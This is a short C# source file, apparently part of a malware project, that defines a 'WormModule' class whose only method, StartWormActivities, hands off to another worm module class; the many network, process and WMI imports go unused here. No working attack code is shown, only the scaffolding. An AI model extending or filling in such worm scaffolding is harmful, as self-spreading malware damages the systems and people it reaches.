using System;
using System.IO;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Management;

namespace XYZ.modules
{
    public class WormModule
    {
        public void StartWormActivities()
        {
            // Use the new worm module structure
            XYZ.modules.worm.WormModule wormModule = new XYZ.modules.worm.WormModule();
            wormModule.StartWormActivities();
        }
    }
}